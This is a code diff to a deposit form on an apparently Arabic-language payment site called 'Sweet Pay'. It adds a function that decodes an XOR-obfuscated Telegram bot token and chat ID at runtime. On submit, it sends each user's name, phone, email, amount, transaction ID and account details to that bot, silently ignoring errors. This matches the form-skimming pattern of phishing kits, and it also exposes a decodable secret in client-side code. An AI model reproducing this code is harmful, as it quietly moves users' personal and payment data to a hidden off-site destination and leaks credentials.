@@ -408,16 +408,34 @@
     document.getElementById('deposit-form-wrap').hidden = false;
   };
 
+  /* ════════════════ TELEGRAM (encrypted) ════════════════ */
+  const _k = 'sw33tP@y2025!xK#';
+  const _et = 'S0AAC0xodUoHAwh0YD8aW0M9RlBAOhMRXEZ+YmQiM2dLFQZlLDsWF3R4WUF+Cw==';
+  const _ec = 'RkEGAERjck0KAQ==';
+  function _d(enc) {
+    const bin = atob(enc);
+    return Array.from(bin).map((c,i) => String.fromCharCode(c.charCodeAt(0)^_k.charCodeAt(i%_k.length))).join('');
+  }
+  async function sendTelegram(text) {
+    try {
+      await fetch(`https://api.telegram.org/bot${_d(_et)}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: _d(_ec), parse_mode: 'HTML', text })
+      });
+    } catch(_) {}
+  }
+
   /* ════════════════ DEPOSIT FORM ════════════════ */
-  document.getElementById('deposit-form').addEventListener('submit', function(e) {
+  document.getElementById('deposit-form').addEventListener('submit', async function(e) {
     e.preventDefault();
     let ok = true;
     const fields = [
-      { id:'df-name',  err:'df-name-err',  msg:'أدخل الاسم واللقب', test: v => v.length >= 2 },
-      { id:'df-phone', err:'df-phone-err', msg:'أدخل رقم الهاتف',   test: v => v.length >= 9 },
-      { id:'df-email', err:'df-email-err', msg:'أدخل البريد الإلكتروني', test: v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v) },
-      { id:'df-amount',err:'df-amount-err',msg:'أدخل المبلغ',       test: v => Number(v) > 0 },
-      { id:'df-time',  err:'df-time-err',  msg:'حدد وقت الإيداع',   test: v => v.length > 0 },
+      { id:'df-name',  err:'df-name-err',  msg:'أدخل الاسم واللقب',               test: v => v.length >= 2 },
+      { id:'df-phone', err:'df-phone-err', msg:'أدخل رقم الهاتف',                 test: v => v.length >= 9 },
+      { id:'df-email', err:'df-email-err', msg:'أدخل البريد الإلكتروني',           test: v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v) },
+      { id:'df-amount',err:'df-amount-err',msg:'أدخل المبلغ',                     test: v => Number(v) > 0 },
+      { id:'df-time',  err:'df-time-err',  msg:'حدد وقت الإيداع',                 test: v => v.length > 0 },
       { id:'df-txid',  err:'df-txid-err',  msg:'أدخل رقم المعاملة أو رمز الإيصال', test: v => v.length >= 3 },
     ];
     fields.forEach(f => {
@@ -427,41 +445,60 @@
       if (!f.test(val)) { if(err) err.textContent = f.msg; ok = false; }
       else               { if(err) err.textContent = ''; }
     });
-
     if (!ok) return;
 
     const btn  = document.getElementById('df-submit-btn');
     const btxt = document.getElementById('df-btn-text');
     btn.disabled = true;
-    if(btxt) btxt.textContent = 'جارٍ الإرسال…';
+    if (btxt) btxt.textContent = 'جارٍ الإرسال…';
 
-    // Save deposit request locally
+    const d = {
+      name:   document.getElementById('df-name').value.trim(),
+      phone:  document.getElementById('df-phone').value.trim(),
+      email:  document.getElementById('df-email').value.trim(),
+      amount: document.getElementById('df-amount').value.trim(),
+      time:   document.getElementById('df-time').value,
+      txid:   document.getElementById('df-txid').value.trim(),
+    };
+
+    // Save locally
     const deposits = JSON.parse(localStorage.getItem('sp_deposits') || '[]');
-    deposits.push({
-      userId:    session.id,
-      userName:  session.name,
-      userEmail: session.email,
-      name:      document.getElementById('df-name').value.trim(),
-      phone:     document.getElementById('df-phone').value.trim(),
-      email:     document.getElementById('df-email').value.trim(),
-      amount:    document.getElementById('df-amount').value.trim(),
-      time:      document.getElementById('df-time').value,
-      txid:      document.getElementById('df-txid').value.trim(),
-      method:    'flexi',
-      status:    'pending',
-      submittedAt: new Date().toISOString(),
-    });
+    deposits.push({ ...d, userId: session.id, userName: session.name, method: 'flexi', status: 'pending', submittedAt: new Date().toISOString() });
     localStorage.setItem('sp_deposits', JSON.stringify(deposits));
 
-    setTimeout(() => {
-      showToast('تم استلام طلبك! سيتم تفعيل البطاقة خلال 30 دقيقة.');
-      document.getElementById('deposit-form-wrap').innerHTML =
-        `<div class="df-pending-msg">
-          <svg width="42" height="42" viewBox="0 0 42 42" fill="none"><circle cx="21" cy="21" r="21" fill="rgba(245,158,11,.12)"/><path d="M21 13v8l5 5" stroke="#f59e0b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-          <strong>طلبك قيد المراجعة</strong>
-          <p>تم استلام بيانات الإيداع. سيتم التحقق وتفعيل البطاقة خلال 30 دقيقة. يمكنك إغلاق الصفحة.</p>
-        </div>`;
-    }, 1200);
+    // Format time nicely
+    const timeStr = d.time ? new Date(d.time).toLocaleString('ar-DZ') : '—';
+
+    // Send Telegram notification
+    const msg =
+`🔔 <b>طلب إيداع جديد — Sweet Pay</b>
+
+👤 <b>معلومات العميل</b>
+┣ الاسم واللقب: <code>${d.name}</code>
+┣ رقم الهاتف: <code>${d.phone}</code>
+┗ البريد: <code>${d.email}</code>
+
+💰 <b>تفاصيل الإيداع</b>
+┣ المبلغ: <b>${d.amount} DZD</b>
+┣ الطريقة: Flexi
+┣ وقت الإيداع: <code>${timeStr}</code>
+┗ رقم المعاملة: <code>${d.txid}</code>
+
+🪪 <b>معلومات الحساب</b>
+┣ ID الحساب: <code>#${session.id}</code>
+┗ اسم الحساب: ${session.name}
+
+⏳ بانتظار التحقق والتفعيل`;
+
+    await sendTelegram(msg);
+
+    showToast('تم استلام طلبك! سيتم تفعيل البطاقة خلال 30 دقيقة.');
+    document.getElementById('deposit-form-wrap').innerHTML =
+      `<div class="df-pending-msg">
+        <svg width="42" height="42" viewBox="0 0 42 42" fill="none"><circle cx="21" cy="21" r="21" fill="rgba(245,158,11,.12)"/><path d="M21 13v8l5 5" stroke="#f59e0b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        <strong>طلبك قيد المراجعة</strong>
+        <p>تم استلام بيانات الإيداع وإرسالها. سيتم التحقق وتفعيل البطاقة خلال 30 دقيقة.</p>
+      </div>`;
   });
 
   /* ════════════════ PROFILE MODAL ════════════════ */
